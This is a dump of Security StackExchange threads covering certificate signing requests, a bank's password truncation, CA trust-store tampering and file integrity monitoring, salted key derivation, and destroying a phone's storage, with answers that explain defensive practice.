<p>Context: I am hosting a webapp (windows VM with IIS webserver) on a (sub)domain that belongs to a customer (on the customer's domain), so I have no control over their DNS settings or certificate-management.</p>
<p>Because we do want to support HTTPS for this customer we have the following process in order to create a SSL certificate to bind in IIS to our webapp.</p>
<ol>
<li>In IIS we create a CSR (cert request) using the subdomain name (of the customer's domain) and customer organisation details.</li>
<li>We send the CSR to the customer, they sign it with their CA of choice and send the .cert back to us.</li>
<li>We 'complete' the CSR in IIS and there comes the cert in IIS. We can then export this cert to have it as a .PFX (with private key and password) and bind it to our IIS webapp. (the customer uses a DNS Record to point their subdomain to our IIS webserver)</li>
</ol>
<p>My question is:
What could the reason be that we (the previous sysadmin) would create the CSR etc, instead of just letting the customer create the certificate fully on their side, and when it's created, just send it to use for installation on the webserver.</p>
<p>Why this 2-phase approach that involves lots of waiting and customer-inaction in the process?</p>
<p>What are the drawbacks to letting the customer fully create and manage their certificate, so the only thing we have to do is just import their certificate and bind it in IIS to our webapp.</p>
","11","3","266651","<blockquote>
<p>My question is: What could the reason be that we (the previous sysadmin) would create the CSR etc, instead of just letting the customer create the certificate fully on their side, and when it's created, just send it to use for installation on the webserver.</p>
</blockquote>
<p>If the customer created everything on their side, they would also need to create the private key and send it to you - which means that they have a copy of your private key and also increases the likelihood that they key is stolen or compromised.</p>
<p>The point of a CSR is that you can send them the details of the certificate you want (e.g, the name/URL that it's for), and your <em>public</em> key - but your <em>private</em> key never gets sent anywhere.</p>
","35"
"266650","266650","Why create a CSR on my own server to have it signed by a 3rd party?","<p>I am looking into our current website certificate-management process and am looking for steps that may be unnecessary and can be simplified. The current process was created by our sysadmin who now left, and I am confused about step 1 below.</p>
<p>Context: I am hosting a webapp (windows VM with IIS webserver) on a (sub)domain that belongs to a customer (on the customer's domain), so I have no control over their DNS settings or certificate-management.</p>
<p>Because we do want to support HTTPS for this customer we have the following process in order to create a SSL certificate to bind in IIS to our webapp.</p>
<ol>
<li>In IIS we create a CSR (cert request) using the subdomain name (of the customer's domain) and customer organisation details.</li>
<li>We send the CSR to the customer, they sign it with their CA of choice and send the .cert back to us.</li>
<li>We 'complete' the CSR in IIS and there comes the cert in IIS. We can then export this cert to have it as a .PFX (with private key and password) and bind it to our IIS webapp. (the customer uses a DNS Record to point their subdomain to our IIS webserver)</li>
</ol>
<p>My question is:
What could the reason be that we (the previous sysadmin) would create the CSR etc, instead of just letting the customer create the certificate fully on their side, and when it's created, just send it to use for installation on the webserver.</p>
<p>Why this 2-phase approach that involves lots of waiting and customer-inaction in the process?</p>
<p>What are the drawbacks to letting the customer fully create and manage their certificate, so the only thing we have to do is just import their certificate and bind it in IIS to our webapp.</p>
","11","3","266652","<blockquote>
<p>What could the reason be that we would create the CSR?</p>
</blockquote>
<p>In the first phase you do not create just a CSR, but a <strong>key pair</strong>. The CSR is derived from the public key of that pair, to be signed with the private key of a CA. It is not possible to use a certificate without this private key, and the private key might leak if transmitted with the certificate.</p>
<blockquote>
<p>The customer uses a DNS Record to point their subdomain to our IIS webserver.</p>
</blockquote>
<blockquote>
<p>Why this 2-phase approach that involves lots of waiting?</p>
</blockquote>
<p>Considering this is a subdomain of a public domain, there is an option without the waiting. You could use Let's Encrypt and automate the entire certificate creation and renewal process. This requires the customer has already added the DNS record. After that, you could utilize some of the <a href=""https://letsencrypt.org/docs/client-options/#clients-windows-/-iis"" rel=""noreferrer"">ACME Client Implementations for Windows / IIS</a>.</p>
","15"
"266650","266650","Why create a CSR on my own server to have it signed by a 3rd party?","<p>I am looking into our current website certificate-management process and am looking for steps that may be unnecessary and can be simplified. The current process was created by our sysadmin who now left, and I am confused about step 1 below.</p>
<p>Context: I am hosting a webapp (windows VM with IIS webserver) on a (sub)domain that belongs to a customer (on the customer's domain), so I have no control over their DNS settings or certificate-management.</p>
<p>Because we do want to support HTTPS for this customer we have the following process in order to create a SSL certificate to bind in IIS to our webapp.</p>
<ol>
<li>In IIS we create a CSR (cert request) using the subdomain name (of the customer's domain) and customer organisation details.</li>
<li>We send the CSR to the customer, they sign it with their CA of choice and send the .cert back to us.</li>
<li>We 'complete' the CSR in IIS and there comes the cert in IIS. We can then export this cert to have it as a .PFX (with private key and password) and bind it to our IIS webapp. (the customer uses a DNS Record to point their subdomain to our IIS webserver)</li>
</ol>
<p>My question is:
What could the reason be that we (the previous sysadmin) would create the CSR etc, instead of just letting the customer create the certificate fully on their side, and when it's created, just send it to use for installation on the webserver.</p>
<p>Why this 2-phase approach that involves lots of waiting and customer-inaction in the process?</p>
<p>What are the drawbacks to letting the customer fully create and manage their certificate, so the only thing we have to do is just import their certificate and bind it in IIS to our webapp.</p>
","11","3","266657","<p>Although the main point (reduced attack surface) has been covered already, I'd like to mention a couple of other aspects:</p>
<ul>
<li><strong>Digital Forensics and Incident Response</strong> (DFIR): in case an incident takes place and the private key is compromised, how easy is it to prove that it was the client's copy of the key that was stolen and not your company's one? Clients usually don't have adequate monitoring in place, which may prove to be a big problem in investigating an intrusion</li>
<li><strong>Brand protection</strong>: in any case, since you are not sure whether <em>every</em> client is competent security-wise, it is much better to handle critical data yourself (i.e. handle the key/certificate lifecycle), even if this introduces more work load, than having to defend your company's reputation because a sloppy client lead to an abused site that affected thousands of users</li>
<li><strong>Contractual agreement</strong>: although not obvious, it may be what the service agreement with the clients require (aside from the CSR signing part)</li>
</ul>
","6"
"266608","266608","Should a bank be able to shorten your password without your involvement?","<p>The bank of a friend changed password policy, such that you are limited to 20 characters. However, he used 24 letters before and thus was not able to log in anymore.
He called his advisor, who suggested, he should try to log in with the first 20 letters of his password... and it worked.</p>
<p>This really made us think about the password storage practice they use: I always assumed that a password is stored only as a hash, (&quot;with a bit of salt&quot;) but never ever in it's plain form. Which would definitely be required to shorten a password by the bank. Or am I wrong?</p>
<p>A similar problem has been stated <a href=""https://security.stackexchange.com/questions/129298/first-x-characters-of-your-password-cannot-be-identical-to-your-previous-one"">here</a>.</p>
<p>Should I be concerned that this bank uses bad information security procedures?</p>
","51","5","266609","<p>This is not very good at all, and it makes me doubt that the bank knows what they are doing.</p>
<p>Max lengths for passwords is not uncommon on older legacy systems. That is bad, but perhaps understandable. But to add this restriction in the year of 2022 is just bad, and I frankly can't understand why one would do that. The only explanation I can come up with is that they have absolutely no clue what they are doing.</p>
<p>My next concern is the same as yours - how were they able to do this? To truncate the password they need to have it in plain text, so one might suspect that they store passwords in plain text. That would be extremely bad. However, we can not know for sure that they store the passwords in plain text just from this observation. An alternative explanation would be that they updated your password the last time you logged in (in the same way as one might update to a stronger hash algorithm when user log in). However, given how strange it is to institue a max length at all, I am prone to assume the worst here.</p>
<p>Finally, the bank could have spared themself having to answer questions from customers who can't log in by just silently truncating the password you enter to the max length. This would literally have been one line of code. In the end, maybe you should be happy that they didn't, so that you were alerted to the poor security practices of this bank.</p>
","15"
"266608","266608","Should a bank be able to shorten your password without your involvement?","<p>The bank of a friend changed password policy, such that you are limited to 20 characters. However, he used 24 letters before and thus was not able to log in anymore.
He called his advisor, who suggested, he should try to log in with the first 20 letters of his password... and it worked.</p>
<p>This really made us think about the password storage practice they use: I always assumed that a password is stored only as a hash, (&quot;with a bit of salt&quot;) but never ever in it's plain form. Which would definitely be required to shorten a password by the bank. Or am I wrong?</p>
<p>A similar problem has been stated <a href=""https://security.stackexchange.com/questions/129298/first-x-characters-of-your-password-cannot-be-identical-to-your-previous-one"">here</a>.</p>
<p>Should I be concerned that this bank uses bad information security procedures?</p>
","51","5","266615","<blockquote>
<p>Should a bank be able to shorten your password without your approval?</p>
</blockquote>
<p>The security policy of an entity that processes users' data is the entity's responsibility, not the users'. As such, the entity doesn't need the users' approval in order to make decisions on any aspect of the policy. Because this can lead to poor practices, though, there are laws that set the minimum level of protection that the entities should provide to their users. Other than that, there's not much one can do, unfortunately.</p>
<blockquote>
<p>[...] never ever in it's plain form. Which would definitely be required to shorten a password by the bank. Or am I wrong?</p>
</blockquote>
<p>There are some ways to achieve this without having to store the password in plaintext. The concept is similar to how password hash migrations may be implemented; here's an example of a password hash migration:</p>
<ul>
<li>there's your password hash in the db</li>
<li>you enter your password at the client side</li>
<li>the password is sent in plaintext (usually/preferrably protected by other means, e.g. TLS) to the server</li>
<li>the server finds that the stored hash is an old one so it sets to replace it with a new one</li>
<li>the password you sent is hashed and compared to the stored hash</li>
<li>the hashes match, hence the password is valid</li>
<li>the password is hashed with the new algorithm</li>
<li>the password hash of the new algorithm replaces the old hash in the db</li>
<li>every time you login from that point on, the new algorithm's hash is used for comparisons</li>
</ul>
<p>Similarly, this is what could have happened in your case:</p>
<ul>
<li>there's the hash of your 24-character-password in the system's db</li>
<li>you entered your 24 characters password</li>
<li>the password is transmitted to the server in plaintext (again, under the protection of e.g. TLS)</li>
<li>the server finds that the stored hash is an old one so it sets to replace it with a new one</li>
<li>the password you sent is hashed and compared to the stored hash</li>
<li>the hashes match, hence your password is valid</li>
<li>the server uses <em>the first 20 characters</em> of your password to produce a new hash</li>
<li>they replace the old hash with the new one</li>
</ul>
<p>What was described above could have been in place for a long time; once they saw that all (or the vast majority) of the users have had their passwords replaced, then they may proceeded in enforcing the rule to the client side as well. The key point here is that they may have done this without having to store the password in plaintext at any time.</p>
<p>Unfortunately, I cannot explain why they have set the limit to the password length; I can hypothesize but that would be a wild guess.</p>
<blockquote>
<p>Should I be concerned that this bank uses bad information security procedures?</p>
</blockquote>
<p>Honestly, only the bank's key people know.</p>
<p>Truth be told, you don't know whether they actually shortened the password or not; it may have <em>always</em> been the case that you were providing a password of 24 characters but they only used the first 20 of them in order to produce the password hash, and now they just decided to enforce the rule at the UI side too.</p>
","15"
"266608","266608","Should a bank be able to shorten your password without your involvement?","<p>The bank of a friend changed password policy, such that you are limited to 20 characters. However, he used 24 letters before and thus was not able to log in anymore.
He called his advisor, who suggested, he should try to log in with the first 20 letters of his password... and it worked.</p>
<p>This really made us think about the password storage practice they use: I always assumed that a password is stored only as a hash, (&quot;with a bit of salt&quot;) but never ever in it's plain form. Which would definitely be required to shorten a password by the bank. Or am I wrong?</p>
<p>A similar problem has been stated <a href=""https://security.stackexchange.com/questions/129298/first-x-characters-of-your-password-cannot-be-identical-to-your-previous-one"">here</a>.</p>
<p>Should I be concerned that this bank uses bad information security procedures?</p>
","51","5","266618","<p>This seems more related to communication strategy with clients. Should clients be advised of the new policy before its implementation? Is there a risk if doing so?</p>
<p>It is not required to store the password in plain text in order to truncate it to 20 characters. The password's string could be handled on the fly, which means they store only the hash of the first 20 characters, side by side with the original password's hash.</p>
<p>They might be implementing the new policy gradually, so at some point the server already had the hashes of the first 20 characters password, while the original is yet in use by the authentication process.</p>
<p><strong>Edit:</strong><br/>
A weak authentication system would store the hash of first 20 characters only and ignore the user's actual secret, that means for the system a passwords like <strong>myTwentyCharPassword</strong> is equivalent to :<br/>
<strong>myTwentyCharPassword6697</strong> or <br/>
<strong>myTwentyCharPassword@222</strong> or <br/>
<strong>myTwentyCharPassword@@00</strong> or ... etc<br/></p>
<p>That's why the hash of the original password must be stored also, for the authentication to work properly as expected by the user.</p>
","3"
"266608","266608","Should a bank be able to shorten your password without your involvement?","<p>The bank of a friend changed password policy, such that you are limited to 20 characters. However, he used 24 letters before and thus was not able to log in anymore.
He called his advisor, who suggested, he should try to log in with the first 20 letters of his password... and it worked.</p>
<p>This really made us think about the password storage practice they use: I always assumed that a password is stored only as a hash, (&quot;with a bit of salt&quot;) but never ever in it's plain form. Which would definitely be required to shorten a password by the bank. Or am I wrong?</p>
<p>A similar problem has been stated <a href=""https://security.stackexchange.com/questions/129298/first-x-characters-of-your-password-cannot-be-identical-to-your-previous-one"">here</a>.</p>
<p>Should I be concerned that this bank uses bad information security procedures?</p>
","51","5","266622","<h3>Most likely the bank always used just 20 characters.</h3>
<p>As Affe already suggested in the comments, the simplest explanation is that nothing has actually changed in the way the bank stores the passwords. Most likely the bank always had an internal password length limit of 20 characters, and the password entry fields used to silently discard the extra characters.</p>
<p>While truncating passwords is not necessarily a great idea, there's no reason to suspect actual security malpractice. Those 20 first characters are probably stored using a reasonable salted hashing scheme or a hardware security module (given all sorts of audit requirements, banks are in general slightly less likely to invent horrible homebrew crypto compared to other companies).</p>
<p>I can speculate that they now stopped silently truncating passwords as a necessary preparatory step towards supporting longer passwords (so that users will likely be able to set a new 24-character password now or in the near future and it will get hashed as a whole).</p>
","56"
"266608","266608","Should a bank be able to shorten your password without your involvement?","<p>The bank of a friend changed password policy, such that you are limited to 20 characters. However, he used 24 letters before and thus was not able to log in anymore.
He called his advisor, who suggested, he should try to log in with the first 20 letters of his password... and it worked.</p>
<p>This really made us think about the password storage practice they use: I always assumed that a password is stored only as a hash, (&quot;with a bit of salt&quot;) but never ever in it's plain form. Which would definitely be required to shorten a password by the bank. Or am I wrong?</p>
<p>A similar problem has been stated <a href=""https://security.stackexchange.com/questions/129298/first-x-characters-of-your-password-cannot-be-identical-to-your-previous-one"">here</a>.</p>
<p>Should I be concerned that this bank uses bad information security procedures?</p>
","51","5","266638","<p>As a developer (with 25yrs experience, 10yrs in banking), I can confirm that <strong>NO bank should EVER store (and therefore &quot;know&quot;) your password</strong>.</p>
<p>When you create a password (e.g. &quot;H3ll0_123!&quot;), your browser sends the password to the bank's backend server which then converts it into a hash (e.g. b89eaac7e61417341b710b727768294d0e6a277b). The only form of your password that ever get stored, is this hashed version of it.</p>
<p>Whenever you later login, your credentials are verified, so the bank once again convert your entered password to a hash and compare it to the stored hash. If they match, then you're successfully verified. If not, you have supplied an incorrect password.</p>
<p>At no stage should the bank interfere with your plain text password (i.e. write it to a log file, store it, display it etc. NEVER! It would be highly unethical)</p>
<p><strong>So in summary</strong>, NO bank, or any service provider for that matter, should EVER know your passwords. And therefore NEVER be able to shorten them on your behalf.</p>
<p>PS: you also can't calculate a shortened password hash from a full sized password hash either - e.g. password &quot;H3ll0_123!&quot; =&gt; hash b89eaac7e61417341b710b727768294d0e6a277b, might translate to something completely different if you shorten it, such as password &quot;H3ll0&quot; =&gt; hash 6c98bf0e3210f1c6923427a1e1a3b214c1de92c467683f64667</p>
","2"
"266509","266509","How do we know that our SSL certificates are to be trusted?","<p>On Linux, the /etc/ssl/certs folder includes all the necessary public keys for Certificate Authorities. If I have not misunderstood something, this makes it possible to verify public keys received from other servers over the internet.</p>
<p>But an adversary, e.g. a program with root privileges, or even a security agency collaborating with developers of a Linux distro, can &quot;plant&quot; its' own certificates or modify the existing ones. This would enable MiTM attacks by making the adversary's fake certificates used for such attacks seem legitimate and signed by a Certificate Authority.</p>
<p>Is there any technique that prevents this, or a way to verify that those keys have not been modified after installation?</p>
","13","3","266517","<p>Trusting the &quot;pre-installed&quot; certificate authorities requires a level of trust on your part for the OS/App you're installing.  Trusting that no one has installed an illegitimate root certificate post-installation requires tooling like a file integrity monitor (FIM) to alert if files are added.</p>
<p>From CISA:</p>
<blockquote>
<p>When you trust a certificate, you are essentially trusting the certificate authority to verify the organization's identity for you. However, it is important to realize that certificate authorities vary in how strict they are about validating all of the information in the requests and about making sure that their data is secure. By default, your browser contains a list of more than 100 trusted certificate authorities. That means that, by extension, you are trusting all of those certificate authorities to properly verify and validate the information. Before submitting any personal information, you may want to look at the certificate.</p>
</blockquote>
<p>File integrity monitors should alert you when a file has been added or deleted, and when files are modified.  When properly configured this would alert you to a certificate chain being added to your server.</p>
<p><strong>References</strong><br />
<a href=""https://www.cisa.gov/uscert/ncas/tips/ST05-010"" rel=""noreferrer"">Understanding Web Certificates</a><br />
<a href=""https://www.crowdstrike.com/cybersecurity-101/file-integrity-monitoring/"" rel=""noreferrer"">What is File Integrity Monitoring</a></p>
","19"
"266509","266509","How do we know that our SSL certificates are to be trusted?","<p>On Linux, the /etc/ssl/certs folder includes all the necessary public keys for Certificate Authorities. If I have not misunderstood something, this makes it possible to verify public keys received from other servers over the internet.</p>
<p>But an adversary, e.g. a program with root privileges, or even a security agency collaborating with developers of a Linux distro, can &quot;plant&quot; its' own certificates or modify the existing ones. This would enable MiTM attacks by making the adversary's fake certificates used for such attacks seem legitimate and signed by a Certificate Authority.</p>
<p>Is there any technique that prevents this, or a way to verify that those keys have not been modified after installation?</p>
","13","3","266521","<blockquote>
<p>Is there any technique that prevents this,[...]</p>
</blockquote>
<p>In principle, you cannot <em>prevent</em> someone from gaining privileged access to your OS and altering files; it's considered just a matter of time and effort. All you can do is make it as difficult as possible and establish detection and recovery procedures for <em>when</em> the intrusion takes place.</p>
<blockquote>
<p>[...] or a way to verify that those keys have not been modified after installation?</p>
</blockquote>
<p>It can usually be done by using <a href=""https://en.wikipedia.org/wiki/File_integrity_monitoring"" rel=""nofollow noreferrer"">file integrity monitoring</a> tools (FIM - e.g. <a href=""https://aide.github.io/"" rel=""nofollow noreferrer"">aide</a>) or full blown <a href=""https://en.wikipedia.org/wiki/Host-based_intrusion_detection_system"" rel=""nofollow noreferrer"">host-based intrusion detection systems</a> (HIDS - e.g. <a href=""https://la-samhna.de/samhain/"" rel=""nofollow noreferrer"">samhain</a>)</p>
<p>However, the use of a FIM (or HIDS, for that matter) requires three things:</p>
<ol>
<li>establish your <a href=""https://www.tripwire.com/state-of-security/file-integrity-monitoring"" rel=""nofollow noreferrer"">integrity baseline</a> <strong>immediately</strong> after your OS installation</li>
<li>establish an <a href=""https://en.wikipedia.org/wiki/Standard_operating_procedure"" rel=""nofollow noreferrer"">SOP</a> to follow when OS updates take place</li>
<li>be serious about safeguarding the integrity baseline produced in step one (and amended with every update)</li>
</ol>
<p>else you may find yourself in the position to trust something that you shouldn't.</p>
<hr />
<p>As a side note, <code>/etc/ssl/</code> is the location used by the <code>openssl</code> software to store its global configuration file, along with its trusted certs and private keys.</p>
<p>It is the default place to look for certs and private keys when a program uses <a href=""https://www.openssl.org/"" rel=""nofollow noreferrer"">openssl</a> as a linked library, but it's not the default for every program you may execute in your box, for example:</p>
<ul>
<li><a href=""https://www.openssh.com/"" rel=""nofollow noreferrer"">openssh</a> uses the <code>/etc/ssh</code> directory for the openssh server's public/private keys and the <code>~/.ssh/</code> directory for the client's trusted public keys</li>
<li><a href=""https://www.mozilla.org/en-US/firefox/new/"" rel=""nofollow noreferrer"">mozila firefox</a> trusts its own <a href=""https://wiki.mozilla.org/CA/Included_Certificates"" rel=""nofollow noreferrer"">CA list</a></li>
<li>java installations have their own CA trust stores (e.g. for <a href=""https://openjdk.org/"" rel=""nofollow noreferrer"">openjdk</a> it's inside <code>/etc/ssl/certs/java</code>)</li>
</ul>
<p>etc.</p>
<p>This is important to understand, because <em>you don't need to gain admin level privileges in order to modify some of the CA lists</em>. For example, you may leave your computer unattended for a minute, someone can launch your browser (let's say firefox for this example), import <a href=""https://docs.titanhq.com/en/55958-importing-ssl-certificate-in-mozilla-firefox.html"" rel=""nofollow noreferrer"">her own CA certificate</a> and then be able to <a href=""https://en.wikipedia.org/wiki/Man-in-the-middle_attack"" rel=""nofollow noreferrer"">mitm</a> you at will.</p>
","3"
"266509","266509","How do we know that our SSL certificates are to be trusted?","<p>On Linux, the /etc/ssl/certs folder includes all the necessary public keys for Certificate Authorities. If I have not misunderstood something, this makes it possible to verify public keys received from other servers over the internet.</p>
<p>But an adversary, e.g. a program with root privileges, or even a security agency collaborating with developers of a Linux distro, can &quot;plant&quot; its' own certificates or modify the existing ones. This would enable MiTM attacks by making the adversary's fake certificates used for such attacks seem legitimate and signed by a Certificate Authority.</p>
<p>Is there any technique that prevents this, or a way to verify that those keys have not been modified after installation?</p>
","13","3","266523","<p>If an adversary or attacker has root level access to your system (and therefore, the ability to plant its own certificates in your system's trust store), then that means your system has been compromised.  If your system has been compromised, that it's game-over irrespectively.</p>
<p>Once your system has been compromised, and the attacker has root level access, the attacker then has complete control of your system.  He or she can access your files, install its own programs, monitor what you do on the system, and monitor your communications - without even needing to plant certificates in your trust store.</p>
","47"
"266475","266475","Encryption key fuzzing for forensics analysts","<p>I'm trying to make a simple encryption tool for Debian-like systems. I would simply hash a password, use it to lock/unlock a file, and it would never be stored on the drive. My dad threw out the idea that a randomly generated hash-like string be made and stored on the system, thereby assuming the key would be a concatenation of the string and a password hash.</p>
<p>Does this make sense to anybody? I don't see the point, but my father was a forensics analyst.</p>
","0","3","266479","<p>There are lots of sensible ways to do <a href=""https://en.wikipedia.org/wiki/Key_derivation_function"" rel=""nofollow noreferrer"">key derivation</a>. Key derivation functions are a kind of hash functions, but normal cryptographic hash functions are often insufficient. Normal hash functions are designed to be fast on large inputs, whereas we want a one-way function that is very expensive even on small inputs, as to make cracking infeasible.</p>
<p>Your general idea is sound. Given some key derivation function H, we can compute an encryption key <code>H(password)</code>.</p>
<p>If the password is strong enough, then this is perfectly fine. For example, if we want to use AES-256 as encryption, our key needs 256 bits of entropy. That is 32 bytes. But passwords are comparatively low entropy, and would need to be much longer to achieve this level of security.</p>
<p>So, an alternative is to derive the key from two parts: a partial key with the purpose of providing enough entropy to secure the encryption, and a human-friendly password. Both of these parts are crucial. Both must be kept secure since they could aid with cracking the key, but either part alone is not sufficient for performing decryption. You can think of the partial key as a salt for the hash function.</p>
<p>Of course, storing the partial key together with the encrypted file would be problematic, but this depends on the exact threat model. Example use cases for such a split key:</p>
<ul>
<li><p>A password manager uses an encrypted vault. The vault may fall into the wrong hands. To open the vault on a new computer, I need a key file that I must separately transfer to that computer, and a password. Once the key file is installed, I will only need the password to subsequently unlock the vault. This strategy is widely used, e.g. by 1Password and optionally by Keepass.</p>
</li>
<li><p>A backup tool stores encrypted backups remotely on an untrusted server. I need to provide an encryption password, from which a key is derived. But to prevent weak keys from being used (for example, by reusing server credentials for encryption), the backup tools generates a cryptographically random partial key. I must store this key separately, and will need it together with my password to make and restore backups.</p>
</li>
</ul>
<p>So, both you and your dad are having sensible ideas here. It would be useful to think about your threat model, about what data an attacker may be able to access, and about what security level is needed. In some cases, relying on a key derivation function might be sufficient. In other cases, you might want to combine the password with some random data to generate a stronger key. But unless you rely on frequent manual entry of the human-readable password part, it might be easier to just generate a strong password/key from the start.</p>
","0"
"266475","266475","Encryption key fuzzing for forensics analysts","<p>I'm trying to make a simple encryption tool for Debian-like systems. I would simply hash a password, use it to lock/unlock a file, and it would never be stored on the drive. My dad threw out the idea that a randomly generated hash-like string be made and stored on the system, thereby assuming the key would be a concatenation of the string and a password hash.</p>
<p>Does this make sense to anybody? I don't see the point, but my father was a forensics analyst.</p>
","0","3","266481","<blockquote>
<p>I would simply hash a password ... My dad threw out the idea that a randomly generated hash-like string be made and stored on the system, thereby assuming the key would be a concatenation of the string and a password hash.</p>
</blockquote>
<p>The difference between the approaches is roughly<sup>*</sup> to hash a password or to hash a password together with a random salt.</p>
<p>Hashing only the password means that an attacker could precompute the hashes for common passwords and then quickly try if the file was encrypted with a common password. Adding a random salt makes such precomputation infeasible because now lots of different hashes are generated for the same password, depending on the random salt.</p>
<p>Of course, making precomputation infeasible is only helpful if the computation of the hash is way more costly then doing a lookup in a precomputed table. Therefore the proper way is to both use a random salt and to have a slow function to derive the encryption key. Common <a href=""https://en.wikipedia.org/wiki/PBKDF2"" rel=""nofollow noreferrer"">password based key derivation functions</a> do exactly this. Thus don't invent your own, use something established instead.</p>
<hr />
<p><sup>*</sup> The concatenation of hashed password with random string would not help. Instead the random string (salt) would need to be included in the hash to make precomputation infeasible. I'm assuming that your dad actually meant this.</p>
","2"
"266475","266475","Encryption key fuzzing for forensics analysts","<p>I'm trying to make a simple encryption tool for Debian-like systems. I would simply hash a password, use it to lock/unlock a file, and it would never be stored on the drive. My dad threw out the idea that a randomly generated hash-like string be made and stored on the system, thereby assuming the key would be a concatenation of the string and a password hash.</p>
<p>Does this make sense to anybody? I don't see the point, but my father was a forensics analyst.</p>
","0","3","266482","<p>Adding some contenxt on @<a href=""https://security.stackexchange.com/users/37315/steffen-ullrich"">Steffen Ullrich</a>'s answer:</p>
<p>Assuming that your father actually meant to use a random value like this:</p>
<p><code>encryption_key = hash(random_value + password)</code></p>
<p>then what he suggested was to use a password <a href=""https://en.wikipedia.org/wiki/Salt_(cryptography)"" rel=""nofollow noreferrer"">salt</a>. Salts are used mainly to differentiate the output of the same password when used by different users. For example, if I were to use the password <code>weakpassword</code> in order to encrypt the file, and you used the same password then the encryption key used by you and me would be the same (since the same input will produce the same hash value).</p>
<p>However, if a different salt was appended to the passwords before they are hashed, the produced keys would differ significantly, even though the passwords are the same.</p>
<p>This technique is used to prevent <a href=""https://en.wikipedia.org/wiki/Password_cracking"" rel=""nofollow noreferrer"">password cracking</a> attacks, especially based on <a href=""https://en.wikipedia.org/wiki/Rainbow_table"" rel=""nofollow noreferrer"">rainbow tables</a>.</p>
<p>A question you may have is, how can an attacker benefit from not using a salt when it comes to an encrypted file, because what was described above was mainly refering to password cracking for access credentials (username/password, e.g. see <a href=""https://erev0s.com/blog/cracking-etcshadow-john/"" rel=""nofollow noreferrer"">here</a>). The answer depends on some other factors that play their part; the encryption mode used and whether we have any idea about the contents of the file. <a href=""https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB)"" rel=""nofollow noreferrer"">ECB mode</a> with <a href=""https://en.wikipedia.org/wiki/Known-plaintext_attack"" rel=""nofollow noreferrer"">known plaintext</a>, even partially, can make finding the password a lot easier.</p>
<p>For example, if a salt is not used, I know that we have partially the same contents in a file and I know the password to my file, by using ECB as an encryption mode you allow me to look for identical file blocks between our files (that correspond to the same plaintext); if I find any, it means that you're using the same password as I do.</p>
","0"
"266448","266448","If I smash this phone into a million pieces is it secure?","<p>This phone that I am using has some <em><strong>very</strong></em> sensitive info on it. I am wondering if it will be secure if I take a hammer and smash it into many pieces, and if I take the pieces and throw them out at various states when I travel will it be unrecoverable?</p>
<p>I am talking about state and government-level security. Not just against petty criminals.</p>
","3","3","266450","<p>If you smash the phone into tiny pieces and scatter them on different places, the data that only exists on the phone is lost forever.</p>
<p>But not all data resides only on your phone. If any online copy exists (in backups, sync, caches or anything else), that data is still alive and can be recovered.</p>
","2"
"266448","266448","If I smash this phone into a million pieces is it secure?","<p>This phone that I am using has some <em><strong>very</strong></em> sensitive info on it. I am wondering if it will be secure if I take a hammer and smash it into many pieces, and if I take the pieces and throw them out at various states when I travel will it be unrecoverable?</p>
<p>I am talking about state and government-level security. Not just against petty criminals.</p>
","3","3","266573","<h1>If you've smashed it <em>properly</em>, most likely secure</h1>
<p>For a modern phone, the two biggest factors for future-proof data destruction are:</p>
<ol>
<li>Whether the phone's storage utilized full encryption;</li>
<li>Whether the storage medium or chip was properly FUBAR'd.</li>
</ol>
<p>Full disk encryption <a href=""https://appleinsider.com/inside/apple-and-encryption"" rel=""nofollow noreferrer"">comes by default on iPhones since the iPhone 4</a>, and became SoC TPM-based (Secure Enclave) since the iPhone 5. If an iPhone is any newer, and had a passcode set, it is reasonable to assume that it uses secure disk encryption.</p>
<p>Android <a href=""https://source.android.com/docs/security/features/encryption/full-disk"" rel=""nofollow noreferrer"">supported full disk encryption</a> as early as 4.4, <a href=""https://source.android.com/docs/security/features/encryption/file-based"" rel=""nofollow noreferrer"">switched to file-based encryption</a> in 7.0, and deprecated full-disk encryption in favour of mandated file-based in 10.0. However, implementations varies wildly across models and brands, so take this information with a grain of salt unless you know the specifications of data-at-rest encryption for your specific device. Android devices should only be somewhat reasonably assumed to use sufficiently secure encryption if it is very new, and from a major brand.</p>
<p>In both cases, if the device was securely encrypted, <em>without easily exploitable vulnerabilities or backdoors</em>, this is already usually enough to shut out even the most resourceful of attackers like state adversaries.</p>
<p>Now, for the physical medium: to prevent side-channel leaks from any such vulnerabilities or backdoors, shredding or incinerating the physical storage medium is the most secure and fastest option across the industry. Bending or deforming the chip helps, but is usually not &quot;secure&quot;; something industrial-sized will be a lot better than a hammer, unless you've been very methodical.</p>
<p>Effectively all cellphones and smartphones ever made for the commercial market use <a href=""https://en.wikipedia.org/wiki/Solid-state_drive"" rel=""nofollow noreferrer"">Solid State Drives</a>, storing the data within persistent semiconductors. The SSD chip itself probably looks something like this:</p>
<p><a href=""https://i.stack.imgur.com/NWL0S.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/NWL0S.jpg"" alt=""iPhone 11 Pro Max NVMe chip, Toshiba TSB4236 512GB"" /></a></p>
<p>If the disk was properly encrypted, smashing the NVMe chip (the grey one in the example image) into pieces will destroy all hope of recovering the data, <em>ever</em>. Even the best modern forensics combined with cryptanalysis attacks won't even start making any headway, and the transistors will begin to lose their storage states within a few years without power, so any theoretical forensics technologies which may apply won't come along before the data is already gone for good. Every single intelligence agency on planet Earth working on it as a joint project will probably still not be able to recover any data whatsoever.</p>
<p>If the disk was <strong>not</strong> properly encrypted, bets are off unless you've either incinerated the chip, or shredded it down to dust. Although there aren't many real-world examples of forensics on destroyed SSDs, you can be certain that it will be insanely impractical to begin to attempt to rebuild the chip at all with sufficiently amounts of destruction, notwithstanding the forensics necessary to recover any data from the storage cells in the first place. And again, the transistors will begin losing their storage states without power, so the window for analysis is somewhat limited.</p>
<p>For your case specifically, since you've been scattering the pieces across various locations, this already increases the difficulty of recovery by an order of magnitude simply by the merit of the pieces being difficult to find, and probably being exposed to weathering. Even in a worst-case scenario (no encryption, less than a dozen pieces) it will likely require at least millions of dollars just to recover a small portion of data.</p>
<p>Most of these suggestions assume a global adversary with vast resources and practically limitless access to latest unknown technologies. Forensics on loose SSD storage cells is extremely, extremely difficult. There are very few cases which would justify this amount of forensic effort to begin with, like if you've stolen all of the CIA's, DoD's, and NSA's top secret files combined since the 1970s and gave it to China. Adapt your threat model according to your needs, and your plausible theoretical adversary.</p>
","1"
"266448","266448","If I smash this phone into a million pieces is it secure?","<p>This phone that I am using has some <em><strong>very</strong></em> sensitive info on it. I am wondering if it will be secure if I take a hammer and smash it into many pieces, and if I take the pieces and throw them out at various states when I travel will it be unrecoverable?</p>
